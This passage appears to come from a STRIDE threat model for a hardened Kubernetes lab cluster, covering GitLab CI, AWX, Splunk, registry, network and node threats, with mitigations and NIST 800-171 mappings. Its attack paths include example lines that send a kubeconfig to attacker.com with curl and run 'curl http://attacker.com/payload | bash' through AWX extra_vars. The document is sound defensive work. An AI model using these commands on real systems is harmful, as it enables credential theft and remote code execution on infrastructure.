> *Attack path:* Attacker opens an MR on `main` with a malicious `.gitlab-ci.yml` → pipeline executes on the MR → `echo $KUBE_CONFIG | base64 -d | curl -d @- https://attacker.com/` → full cluster access token exfiltrated before code review. No source code is changed; only the pipeline definition is malicious.

*Threat actors:* TA-2, TA-4 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [IA-3.5.1](cmmc-mapping.md#ia-351--identify-and-authenticate-users)

---

#### T — Tampering

**T-5.1 | CRITICAL — Pipeline deploys malicious workloads to cluster**

A pipeline with cluster-deploy credentials that can be triggered by a compromised developer account or socially engineered pipeline can deploy arbitrary Kubernetes resources, including workloads that do not appear in the source repository if the pipeline uses inline manifests or dynamically generates deployment YAML.

*Threat actors:* TA-2, TA-4 | *NIST:* [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**T-5.2 | HIGH — Dependency confusion / supply chain poisoning**

GitLab pipelines typically install packages from public registries (`pip install`, `npm install`, `helm repo add`). A dependency confusion attack plants a malicious package in a public registry with the same name as a private internal package. If the pipeline resolves packages from public registries before checking private ones, malicious code runs in the build context — which has access to all CI/CD variables including kubeconfigs.

*Threat actors:* TA-2 | *NIST:* [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk), [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations)

---

#### R — Repudiation

**R-5.1 | MEDIUM — Shared CI service account prevents attribution**

If all pipeline stages deploy using a single `ci-deploy` ServiceAccount, the kube-apiserver audit log records the service account identity for every deployment. When an unauthorized change is deployed, determining which pipeline job, which branch, or which developer triggered it requires manual cross-referencing with GitLab pipeline logs — feasible but time-consuming under incident conditions.

*Threat actors:* TA-4 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

### 6.6 AWX / Ansible Automation

AWX provides centralized Ansible execution with RBAC-controlled job templates and a secure credential store. It is a highly privileged component: playbooks can SSH to any managed host as root, modify any configuration file, and install arbitrary software. AWX represents the highest-privilege non-cluster component in the stack.

---

#### S — Spoofing

**S-6.1 | HIGH — AWX credential store exfiltration**

AWX stores all credentials (SSH keys, Vault passwords, API tokens, cloud provider keys) encrypted in its PostgreSQL database using a symmetric key stored in the AWX deployment as the `SECRET_KEY` environment variable. A compromise of the AWX pod — achievable via a known CVE in AWX's Django application or its dependencies — retrieves both the encrypted credentials and the decryption key, extracting all managed credentials in plaintext. These credentials typically include root SSH access to all cluster nodes.

> *Attack path:* Attacker exploits AWX web UI CVE → RCE in AWX pod → reads `SECRET_KEY` from environment → decrypts credential database → extracts root SSH private key for all managed nodes → full infrastructure compromise.

*Threat actors:* TA-1, TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

#### E — Elevation of Privilege

**E-6.1 | CRITICAL — Arbitrary playbook execution via variable injection**

AWX executes playbooks using credentials assigned to job templates. If a user can trigger an existing template with a custom `extra_vars` input (enabled by "Ask at launch" on variable fields), they may inject YAML/JSON that overrides playbook variables or task definitions, running arbitrary commands on all managed hosts as root. This is a documented Ansible injection vector.

> *Attack path:* Developer with AWX "Execute" permission on a template with "Ask at launch" enabled → passes `{"tasks": [{"shell": "curl http://attacker.com/payload | bash"}]}` in extra_vars → arbitrary code executes on all managed nodes as root.

*Threat actors:* TA-3, TA-4 | *NIST:* [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users), [CM-3.4.5](cmmc-mapping.md#cm-345--define-access-restrictions-for-configuration-changes), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

### 6.7 Splunk SIEM

Splunk receives audit logs, security events, and system telemetry from all cluster components. Its integrity is a prerequisite for all detection capability: a compromised Splunk environment means an attacker can operate without any visibility from the security tooling.

---

#### T — Tampering

**T-7.1 | CRITICAL — Audit log deletion by compromised Splunk admin**

An attacker who gains Splunk `admin` access can delete entire indexes, suppress ingestion from specific sources, modify saved searches and alert thresholds, or create suppression rules that prevent specific event patterns from ever surfacing in dashboards. All forensic evidence of an active compromise can be removed retroactively, eliminating the ability to conduct incident response or post-incident analysis.

*Threat actors:* TA-3, TA-5 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [AU-3.3.2](cmmc-mapping.md#au-332--ensure-actions-can-be-traced-to-users), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

**T-7.2 | HIGH — HEC token abuse for log injection / poisoning**

Splunk HEC tokens, if stolen from pod environment variables or config files, allow any network-accessible client to inject arbitrary events into any accessible index with no other authentication. This capability can be used to poison alert baselines (making benign events trigger alerts via volume flooding), create fabricated "clean" events that bury genuinely suspicious ones, or crash alert rules with malformed event data.

> *Attack path:* Attacker reads HEC token from a pod's environment → crafts events with timestamps backdated to before the attack window → injects high-volume "normal" authentication events → analyst's investigation of the suspicious time window is flooded with noise.

*Threat actors:* TA-5 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

#### R — Repudiation

**R-7.1 | HIGH — Audit policy gaps create blind spots**

If the kube-apiserver audit policy does not log at `RequestResponse` level for secrets resources, or if the `aide_to_splunk.py` pipeline fails silently (network partition, HEC token expiry), gaps exist in the audit trail. An attacker who understands the audit policy can deliberately restrict their activity to resource types and verbs that do not trigger detailed logging, operating entirely in documented blind spots.

*Threat actors:* TA-3 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks)

---

### 6.8 Container Registry

The cluster pulls container images from the GitLab Container Registry. Image integrity is a supply chain control: every node that pulls a malicious image executes attacker-controlled code from the moment the container starts.

---

#### T — Tampering

**T-8.1 | HIGH — Mutable image tag overwrite**

Container image tags (`latest`, `v1.0`, `stable`) are mutable pointers; the same tag can be repointed to a different image digest at any time. An attacker who gains registry push credentials can overwrite an existing tag with a malicious image. Nodes that pull the tag during the next deployment execute the malicious image with no indication in deployment manifests that anything changed — the YAML still references `image: myapp:v1.0`.

*Threat actors:* TA-2, TA-4 | *NIST:* [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations), [CM-3.4.3](cmmc-mapping.md#cm-343--track-and-control-system-changes), [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk)

---

**T-8.2 | MEDIUM — Base image poisoning via upstream compromise**

Workloads that build `FROM rockylinux:9` pull from the public registry at build time. A compromised upstream base image executes its malicious layers in every container built from it, even if the application code and Dockerfile are completely clean and unmodified.

*Threat actors:* TA-2 | *NIST:* [SA-3.12.1](cmmc-mapping.md#sa-3121--monitor-and-protect-against-supply-chain-risk), [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations)

---

#### I — Information Disclosure

**I-8.1 | MEDIUM — Credentials embedded in image layers**

A common mistake is including credentials in a Dockerfile's `RUN` or `ENV` instruction. Even if the credential is removed in a subsequent layer, it remains accessible in the intermediate layer history and can be extracted by anyone with image pull access using `docker history` or layer inspection tools.

*Threat actors:* TA-1, TA-4 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

### 6.9 Ingress Controller

The NGINX Ingress Controller is the cluster's external-facing component, terminating TLS and routing traffic to backend services. It is the first meaningful security control for external traffic.

---

#### S — Spoofing

**S-9.1 | HIGH — TLS private key compromise enables MITM**

If the TLS private key for any ingress hostname is extracted from the Kubernetes Secret in the ingress namespace (requiring `get secrets` access), an attacker positioned on the network path between clients and the cluster can present the legitimate certificate and conduct a transparent man-in-the-middle attack, intercepting credentials and session tokens for all services behind that hostname.

*Threat actors:* TA-1, TA-3 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [SC-3.13.10](cmmc-mapping.md#sc-31310--establish-and-manage-cryptographic-keys)

---

#### D — Denial of Service

**D-9.1 | MEDIUM — Layer 7 request flood exhausting worker capacity**

The NGINX Ingress operates at the application layer. A targeted HTTP flood against expensive endpoints — GitLab's repository API or Splunk's search endpoint — saturates NGINX worker processes and makes all ingress-exposed services unavailable. Unlike a network-layer flood, Layer 7 floods are harder to filter at the firewall because individual requests appear syntactically valid.

*Threat actors:* TA-1 | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [SI-3.14.2](cmmc-mapping.md#si-3142--provide-protection-from-malicious-code)

---

### 6.10 Pod-to-Pod Network (East-West)

By default, Kubernetes implements a flat network model: any pod can reach any other pod on any port, in any namespace, cluster-wide. Without `NetworkPolicy` objects enforced by a CNI plugin, east-west traffic is completely unrestricted.

---

#### I — Information Disclosure

**I-10.1 | HIGH — Unrestricted east-west pod communication**

A compromised pod in the `monitoring` namespace can connect to the `production` namespace's database pods, the etcd service ClusterIP, or the kube-apiserver internal endpoint without any network-layer restriction. The only controls are RBAC (for Kubernetes API calls) and application-level authentication (for non-K8s services, which may use weak or no authentication on internal ports).

> *Attack path:* Attacker compromises a Grafana pod via a known CVE → uses pod network to probe `postgres.production.svc.cluster.local:5432` → no NetworkPolicy exists to block the connection → credential brute-force against database succeeds.

*Threat actors:* TA-5 | *NIST:* [SC-3.13.1](cmmc-mapping.md#sc-3131--monitor-and-control-communications-at-boundaries), [AC-3.1.3](cmmc-mapping.md#ac-313--control-flow-of-cui)

---

#### E — Elevation of Privilege

**E-10.1 | HIGH — CoreDNS poisoning redirects service discovery**

CoreDNS resolves service names for all pods in the cluster. A compromised pod with write access to the CoreDNS ConfigMap (`kube-system` namespace) can redirect service discovery lookups — causing pods cluster-wide to connect to attacker-controlled services instead of legitimate backends. This enables credential harvesting (capturing credentials submitted to a fake database or auth service) and session hijacking at scale.

*Threat actors:* TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use)

---

### 6.11 Kubernetes Secrets

Kubernetes Secrets are the native credential management mechanism, used for database passwords, TLS certificates, registry credentials, service account tokens, and application API keys.

---

#### I — Information Disclosure

**I-11.1 | CRITICAL — Secrets mounted as environment variables are widely leakable**

When secrets are mounted as environment variables (`envFrom: secretRef`), their values are visible in pod descriptions (`kubectl describe pod`), accessible via `/proc/<pid>/environ` on the node (readable after a container escape), and frequently captured by application startup logging that dumps configuration.

*Threat actors:* TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**I-11.2 | HIGH — Application logging captures secret values**

Many frameworks log startup configuration: Spring Boot Actuator, Flask debug mode, Node.js `process.env` dumps. If a Secret mounted as an environment variable contains a credential and the application logs its configuration on startup, the credential appears in application logs that are collected by Splunk — potentially accessible to a wider set of users than intended.

*Threat actors:* TA-4, TA-5 | *NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

### 6.12 Longhorn Storage

Longhorn provides distributed block storage, replicating volumes across nodes. It manages persistent data for all stateful applications.

---

#### T — Tampering

**T-12.1 | HIGH — Volume snapshot exfiltration to external storage**

Longhorn supports volume snapshots and backups to S3-compatible object storage. A pod with access to the Longhorn API can trigger a snapshot of any volume — including FreeIPA's LDAP database, GitLab's repositories, or Splunk's indexes — and configure export to an attacker-controlled S3 endpoint. This creates a complete offline copy of sensitive data without modifying the live volumes.

*Threat actors:* TA-3, TA-5 | *NIST:* [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

### 6.13 Monitoring Stack (Zabbix / Grafana / Prometheus)

The monitoring stack observes the entire cluster. Its data paths touch every node and every service, making it both a high-value intelligence target and a potential lateral movement staging area.

---

#### I — Information Disclosure

**I-13.1 | HIGH — Prometheus metrics exposing credentials or operational data**

Prometheus scrapes metrics endpoints that may expose sensitive operational data: request counts, error rates, database connection counts, and in misconfigured applications, actual data values embedded in label sets. Prometheus's web UI exposes the complete scrape configuration — including `basic_auth` credentials embedded in `scrape_configs` — to any user who can reach the endpoint.

*Threat actors:* TA-1, TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [AC-3.1.1](cmmc-mapping.md#ac-311--limit-system-access-to-authorized-users)

---

**I-13.2 | MEDIUM — Grafana datasource credentials readable via API**

Grafana stores datasource connection strings (Splunk, Prometheus, database URLs) in its internal database. Any user with the `Editor` or `Admin` Grafana role can retrieve full datasource configurations including credentials via the Grafana HTTP API — without any additional authentication challenge beyond the Grafana login.

*Threat actors:* TA-1, TA-5 | *NIST:* [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

### 6.14 Node OS (Rocky Linux 9)

The node operating system is the trust foundation for all workloads. A compromised node OS invalidates all container-level security controls and gives an attacker access to every pod running on that node.

---

#### T — Tampering

**T-14.1 | HIGH — Unpatched kernel CVE enabling container escape**

Container isolation depends on kernel namespaces and cgroups. A privilege escalation CVE targeting namespace boundaries, `ptrace`, or `io_uring` — run from within a container — can break all container boundaries and give the attacker root on the host OS. Rocky Linux 9's security update cadence and `kpatch` kernel live-patch capability must be maintained to close this vector.

*Threat actors:* TA-2, TA-5 | *NIST:* [SI-3.14.1](cmmc-mapping.md#si-3141--identify-and-manage-information-system-flaws), [CM-3.4.4](cmmc-mapping.md#cm-344--analyze-security-impact-of-changes)

---

**T-14.2 | HIGH — AIDE baseline bypass via database manipulation**

AIDE monitors the filesystem for unauthorized changes. If an attacker who has already achieved node-level persistence knows that AIDE is running, they can update the AIDE database to include their malicious files as "authorized," making subsequent AIDE checks report no drift. This requires root access to write to the AIDE database file but is trivially accomplished after a successful node compromise.

*Threat actors:* TA-3, TA-5 | *NIST:* [SI-3.14.7](cmmc-mapping.md#si-3147--identify-unauthorized-use), [CM-3.4.1](cmmc-mapping.md#cm-341--establish-baseline-configurations)

---

## 7. Cross-Cutting Threats

These threats span multiple components and trust boundaries and cannot be addressed by hardening a single component.

---

**XC-1 | HIGH — Credential reuse across services**

The cluster's service stack shares common administrative credentials in practice (e.g., a single "lab password" reused across Grafana, AWX, and GitLab admin accounts). A single compromised credential enables lateral movement to all systems that share it. Per-service, per-user credentials managed through FreeIPA and Vault are the required control.

*NIST:* [IA-3.5.7](cmmc-mapping.md#ia-357--enforce-password-complexity), [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication)

---

**XC-2 | HIGH — Stale ServiceAccount tokens**

ServiceAccount tokens created before Kubernetes 1.24 (and tokens created as `kubernetes.io/service-account-token` Secrets on any version) are non-expiring by default and remain valid indefinitely. Decommissioned services, completed pipeline jobs, and orphaned namespaces may leave active tokens in CI/CD variables or configuration files long after they are no longer needed, providing persistent access with no expiry.

*NIST:* [IA-3.5.4](cmmc-mapping.md#ia-354--employ-replay-resistant-authentication), [AC-3.1.2](cmmc-mapping.md#ac-312--limit-system-access-to-authorized-transaction-types)

---

**XC-3 | HIGH — Insufficient audit log coverage**

The default Kubernetes audit policy logs at `Metadata` level — capturing who did what, but not the content of requests or responses. For Secrets in particular, `RequestResponse` level logging is required to capture what credential values were read. Without it, a mass secret exfiltration generates only `get secrets` events with no indication of what values were returned.

*NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SI-3.14.6](cmmc-mapping.md#si-3146--monitor-organizational-systems-for-attacks)

---

**XC-4 | MEDIUM — Backup security gaps**

etcd snapshots, Longhorn volume backups, and GitLab database dumps are complete copies of sensitive data. Backups stored without encryption, integrity checksums, or access controls represent the same risk as a live data breach but with a longer exposure window and no runtime detection capability.

*NIST:* [MP-3.8.3](cmmc-mapping.md#mp-383--sanitize-media-containing-cui), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

**XC-5 | MEDIUM — Clock synchronization as Kerberos dependency**

FreeIPA's Kerberos implementation requires all participants to have clocks synchronized within 5 minutes. Clock drift on any node — caused by VM clock skew, NTP misconfiguration, or deliberate manipulation — causes Kerberos authentication failures, effectively locking all users out of every OIDC-authenticated service simultaneously. Deliberate clock manipulation could also extend the validity of captured Kerberos tickets.

*NIST:* [AU-3.3.1](cmmc-mapping.md#au-331--create-and-retain-audit-records), [SC-3.13.8](cmmc-mapping.md#sc-3138--implement-cryptographic-mechanisms)

---

## 8. Threat Summary Matrix

| ID | Component | STRIDE | Threat | Likelihood | Impact | Risk |
|---|---|---|---|---|---|---|
| S-1.1 | kube-apiserver | S | Stolen kubeconfig impersonation | MED | CRIT | **CRITICAL** |
| T-1.2 | kube-apiserver | T | RBAC policy escalation | MED | CRIT | **CRITICAL** |
| I-1.1 | kube-apiserver | I | Secret enumeration via list/get | HIGH | CRIT | **CRITICAL** |
| E-1.1 | kube-apiserver | E | Privileged pod container escape | MED | CRIT | **CRITICAL** |
| T-2.1 | etcd | T | Direct etcd write bypassing RBAC | LOW | CRIT | **HIGH** |
| I-2.1 | etcd | I | Secrets at rest not encrypted | HIGH | CRIT | **CRITICAL** |
| S-2.1 | etcd | S | etcd client certificate forgery | LOW | CRIT | **HIGH** |
| T-2.2 | etcd | T | Backup snapshot exfiltration | MED | HIGH | **HIGH** |
| E-3.1 | kubelet | E | Container escape to node OS | MED | CRIT | **CRITICAL** |
| E-6.1 | AWX | E | Arbitrary playbook as root | MED | CRIT | **CRITICAL** |
| T-7.1 | Splunk | T | Audit log deletion | LOW | CRIT | **HIGH** |
| S-1.2 | kube-apiserver | S | ServiceAccount token theft | HIGH | HIGH | **HIGH** |
| T-1.1 | kube-apiserver | T | Malicious admission webhook | LOW | CRIT | **HIGH** |
| S-4.1 | FreeIPA | S | FreeIPA admin credential compromise | LOW | CRIT | **HIGH** |
| S-4.2 | FreeIPA | S | Kerberos golden ticket | LOW | CRIT | **HIGH** |
| D-4.1 | FreeIPA | D | FreeIPA outage cascades auth | MED | HIGH | **HIGH** |
| S-5.1 | GitLab CI | S | CI/CD variable exfiltration | HIGH | HIGH | **HIGH** |
| T-5.1 | GitLab CI | T | Malicious pipeline deploys | MED | CRIT | **HIGH** |
| T-5.2 | GitLab CI | T | Supply chain poisoning | MED | HIGH | **HIGH** |
| S-6.1 | AWX | S | AWX credential store exfiltration | MED | CRIT | **HIGH** |
| T-7.2 | Splunk | T | HEC log injection / poisoning | MED | HIGH | **HIGH** |
| T-8.1 | Registry | T | Mutable tag overwrite | MED | HIGH | **HIGH** |
| I-10.1 | Pod network | I | Unrestricted east-west traffic | HIGH | HIGH | **HIGH** |
| I-11.1 | Secrets | I | Env var secret leakage | HIGH | HIGH | **HIGH** |
| I-11.2 | Secrets | I | Application logging captures secrets | MED | HIGH | **HIGH** |
| T-12.1 | Longhorn | T | Volume snapshot exfiltration | LOW | HIGH | **MEDIUM** |
| I-13.1 | Prometheus | I | Metrics or scrape credential exposure | MED | MED | **MEDIUM** |
| T-14.1 | Node OS | T | Kernel CVE container escape | LOW | CRIT | **HIGH** |
| T-14.2 | Node OS | T | AIDE baseline bypass | LOW | HIGH | **MEDIUM** |
| S-1.3 | kube-apiserver | S | OIDC token replay | LOW | HIGH | **MEDIUM** |
| S-3.1 | kubelet | S | Unauthenticated kubelet API | LOW | HIGH | **MEDIUM** |
| I-4.1 | FreeIPA | I | LDAP anonymous bind | MED | MED | **MEDIUM** |
| R-1.1 | kube-apiserver | R | Shared kubeconfig no attribution | HIGH | MED | **MEDIUM** |
| XC-2 | Cross-cutting | - | Stale SA tokens | HIGH | HIGH | **HIGH** |
| XC-3 | Cross-cutting | - | Insufficient audit coverage | HIGH | HIGH | **HIGH** |

*Likelihood: HIGH = actively exploitable with common tools; MED = requires targeted effort; LOW = requires significant skill or specific access conditions*

---

## 9. Mitigations and Controls

### 9.1 Kubernetes API Server Hardening

| Control | Implementation | Priority |
|---|---|---|
| Encrypt secrets at rest | `--encryption-provider-config` with `secretbox` algorithm on kube-apiserver | **P1** |
| Enable `RequestResponse` audit logging for secrets | `/etc/kubernetes/audit-policy.yaml` — `level: RequestResponse` for `secrets` resource | **P1** |
| Verify anonymous auth disabled | `--anonymous-auth=false` (RKE2 default; confirm via `curl -sk https://apiserver:6443/api`) | **P1** |
| Enable NodeRestriction admission | `--enable-admission-plugins=NodeRestriction,...` (RKE2 default; verify active) | **P1** |
| Audit RBAC bindings weekly | Script to diff ClusterRoleBindings vs approved baseline; alert in Splunk on changes | **P1** |
| Implement OPA/Gatekeeper policies | Block `cluster-admin` grants to non-system principals; enforce label selectors | P2 |
| Disable profiling endpoint | `--profiling=false` | P2 |
| Rotate all cluster certificates annually | Monitor cert expiry via Zabbix; document rotation runbook | P2 |

### 9.2 etcd Protection

| Control | Implementation | Priority |
|---|---|---|
| Restrict etcd to loopback and control-plane IP only | `--listen-client-urls=https://127.0.0.1:2379,https://<cp-ip>:2379` | **P1** |
| Enforce mTLS on all etcd connections | Dedicated etcd CA separate from Kubernetes CA (RKE2 default; verify) | **P1** |
| Encrypt etcd snapshots before storing | GPG-encrypt snapshots before writing to backup storage | **P1** |
| Monitor etcd disk usage | Zabbix alert at 70% and 85% disk utilization on `/var/lib/etcd` | P2 |
| Store etcd CA private key offline or in HSM | Remove from control plane filesystem after certificate issuance | P2 |

### 9.3 RBAC Least Privilege

| Control | Implementation | Priority |
|---|---|---|
| Audit all `cluster-admin` ClusterRoleBindings | `kubectl get clusterrolebindings -o yaml` weekly; Splunk alert on any new binding | **P1** |
| Prefer namespace-scoped Roles over ClusterRoles | Review all CRBs; downscope to namespaced Roles where cluster-wide access is unnecessary | **P1** |
| Remove `list` on secrets from workload service accounts | No workload SA should have `list secrets`; audit policy enforced by OPA | **P1** |
| Use short-lived projected ServiceAccount tokens | `serviceAccountToken` projection with `expirationSeconds: 3600` on all pods | **P1** |
| Issue per-pipeline-stage ServiceAccounts | Each GitLab pipeline stage gets its own scoped SA rather than a shared CI account | P2 |

### 9.4 Pod Security

| Control | Implementation | Priority |
|---|---|---|
| Enable PodSecurity `restricted` profile | Label all namespaces: `pod-security.kubernetes.io/enforce: restricted` | **P1** |
| Block host namespace sharing | PSA restricted profile + OPA policy; alert on any `hostPID/hostNetwork/hostIPC: true` | **P1** |
| Block privileged containers | PSA restricted profile; verify RKE2 CIS baseline enforces this | **P1** |
| Require non-root user context | `runAsNonRoot: true` and `runAsUser: >1000` in all SecurityContexts | **P1** |
| Drop all Linux capabilities | `capabilities: drop: [ALL]` in all container SecurityContexts | P2 |
| Require read-only root filesystems | `readOnlyRootFilesystem: true` where application design permits | P2 |

### 9.5 Network Policy

| Control | Implementation | Priority |
|---|---|---|
| Default-deny all ingress and egress per namespace | Apply `NetworkPolicy` with empty `podSelector: {}` to every namespace | **P1** |
| Explicitly allowlist required service paths | Per-namespace allowlist policies; document all allowed paths in NetBox | **P1** |
| Isolate `kube-system` from workload namespaces | NetworkPolicy blocks workload pods from reaching etcd ClusterIP and kubelet ports | **P1** |
| Restrict pod egress to known lab CIDRs | Block `0.0.0.0/0` egress; allowlist lab subnet and DNS only | P2 |

### 9.6 Secret Management

| Control | Implementation | Priority |
|---|---|---|
| Implement Sealed Secrets or Vault for all secrets | Zero plaintext secrets in Git; all secrets managed via Vault or Sealed Secrets | **P1** |
| Mount secrets as volumes, not environment variables | Volume mounts with `defaultMode: 0400`; audit all Deployments for `envFrom: secretRef` | **P1** |
| Rotate secrets on any suspected compromise | Document rotation procedures for each secret type; test runbooks quarterly | **P1** |
| Run daily secret access audit | `k8s_secret_auditor.py` on nightly audit log export; Splunk alert on `BURST_ACCESS` and `SENSITIVE_NAME` | **P1** |

### 9.7 CI/CD Security

| Control | Implementation | Priority |
|---|---|---|
| Protect `main` branch; require MR reviews | GitLab branch protection; minimum 1 required approver before merge | **P1** |
| Scope CI ServiceAccounts to minimum required permissions | Separate namespace-scoped SA per application; no cluster-admin for CI | **P1** |
| Pin image digests in pipelines | Use `image@sha256:...` in all `.gitlab-ci.yml`; tag references are mutable | **P1** |
| Scan images in pipeline with Trivy | Add `trivy image` stage before any deploy step; block on CRITICAL severity CVEs | **P1** |
| Rotate CI/CD credentials on personnel offboarding | Pipeline variables tied to FreeIPA group membership; revoke on FreeIPA offboard | P2 |
| Use OIDC for pipeline cluster auth instead of static tokens | Replace CI kubeconfig with short-lived OIDC tokens via GitLab OIDC integration | P2 |

### 9.8 FreeIPA / Identity

| Control | Implementation | Priority |
|---|---|---|
| Enforce MFA for all human admin accounts | FreeIPA OTP (TOTP) mandatory for members of the `admins` group | **P1** |
| Disable anonymous LDAP bind | `ldapmodify`: set `nsslapd-allow-anonymous-access: rootdse` | **P1** |
| Run daily account lifecycle audit | `freeipa_account_auditor.py` nightly; Splunk alert on stale admin accounts | **P1** |
| Restrict `krbtgt` knowledge | IPA admin password in offline password manager; rotate annually | P2 |
| Deploy FreeIPA replica for HA | `ipa-replica-install` on a second VM to eliminate authentication SPOF | P3 |

### 9.9 Logging and Audit

| Control | Implementation | Priority |
|---|---|---|
| Ship all audit logs to Splunk in real time | `aide_to_splunk.py` + `k8s_secret_auditor.py` pipelines operational on all nodes | **P1** |
| Set minimum 90-day log retention | Splunk index retention policy configured to match CMMC AU requirement | **P1** |
| Alert on audit log source gaps | Splunk monitor alert if any HEC source is absent for more than 15 minutes | **P1** |
| Protect Splunk admin credentials in Vault | No plaintext Splunk credentials in any config file, CI variable, or playbook | **P1** |
| Run AIDE daily on all nodes | Cron job at 03:00 local: `aide --check 2>&1 | python3 /usr/local/bin/aide_to_splunk.py --report -` | **P1** |

### 9.10 Image and Supply Chain

| Control | Implementation | Priority |
|---|---|---|
| Scan all images before deployment | Trivy in CI pipeline; fail pipeline on CRITICAL severity CVEs with no exception | **P1** |
| Use immutable image digest references | Deployment manifests reference `@sha256:...`; Kyverno policy enforces compliance | P2 |
| Operate a private container registry | GitLab Container Registry for all workload images; no direct public pulls in production namespaces | P2 |
| Verify base image provenance | Maintain approved base image allowlist; Kyverno validates image registry source | P2 |

---

## 10. NIST 800-171 Control Mapping

| Threat IDs | NIST Control | Control Description | Implementation |
|---|---|---|---|
| S-1.1, S-1.2, S-2.1, S-4.1, S-6.1 | **IA-3.5.1** | Identify information system users and authenticate before allowing access | Unique identifiers; prohibit shared credentials; mTLS everywhere |
| T-1.2, E-1.1, E-1.2, E-6.1, I-1.1 | **AC-3.1.1** | Limit system access to authorized users and legitimate transactions | RBAC least privilege; deny privileged containers; restrict secret access |
| I-1.1, I-10.1, I-4.1 | **AC-3.1.3** | Control the flow of CUI per approved authorizations | NetworkPolicy enforcement; namespace isolation; LDAP access controls |
| I-2.1, T-2.2, T-8.1, I-11.1 | **SC-3.13.8** | Implement cryptographic mechanisms to prevent unauthorized CUI disclosure | Encrypt secrets at rest; TLS on all transports; GPG-encrypted backups |
| T-1.1, T-1.2, T-2.1, T-7.2 | **CM-3.4.3** | Track, review, approve, and log changes to organizational systems | RBAC auditing; admission webhooks; change management process |
| R-1.1, R-5.1, R-7.1, XC-3 | **AU-3.3.1** | Create and retain system audit records to enable monitoring and analysis | RequestResponse audit logging for secrets; 90-day retention; Splunk correlation |
| T-7.1, T-14.2, XC-3 | **SI-3.14.7** | Identify unauthorized use of organizational systems | k8s_secret_auditor + AIDE + Splunk detection rules |
| D-1.1, D-2.1, D-4.1, D-9.1 | **SC-3.13.1** | Monitor, control, and protect CUI communications at external boundaries | Rate limiting; network segmentation; IPA HA architecture |
| T-5.2, T-8.1, T-14.1, T-8.2 | **SA-3.12.1** | Monitor and protect the integrity of security-relevant software | Image scanning; signed images; dependency pinning; patch management |
| XC-2, S-1.2, S-1.4 | **IA-3.5.2** | Authenticate identities of users, processes, or devices before access | Token rotation; certificate lifecycle management; short-lived SA tokens |
| I-1.2, I-13.1 | **SI-3.14.6** | Monitor systems including inbound/outbound communications for attacks | Prometheus restrictions; kube-apiserver discovery endpoint controls |
| T-14.1 | **CM-3.4.4** | Analyze security impact of changes before implementation | Patch management; kernel CVE tracking; staged rollout for updates |
| T-2.2, T-12.1 | **MP-3.8.3** | Sanitize or destroy CUI before disposal or reuse | Encrypted backups; access-controlled snapshot storage |
| T-1.2, T-5.1 | **CM-3.4.5** | Define, document, approve, and enforce access restrictions for configuration changes | PR review requirements; admission control; change approval workflow |
| S-4.1, XC-1 | **IA-3.5.7** | Enforce minimum password complexity and change requirements | FreeIPA password policy; MFA for admins; per-service credentials |
| XC-2, S-1.2 | **AC-3.1.2** | Limit system access to types of transactions authorized users may execute | ServiceAccount scope restrictions; HBAC rules in FreeIPA |

---

## 11. Residual Risk Register

After implementing all P1 controls defined in Section 9, the following risks remain and are formally accepted as part of the lab design:

| Risk ID | Description | Residual Likelihood | Residual Impact | Accepted? | Rationale |
|---|---|---|---|---|---|
| RR-01 | Single-node control plane — etcd SPOF | LOW | HIGH | **Yes** | Lab hardware constraint; backup and recovery procedure documented and tested |
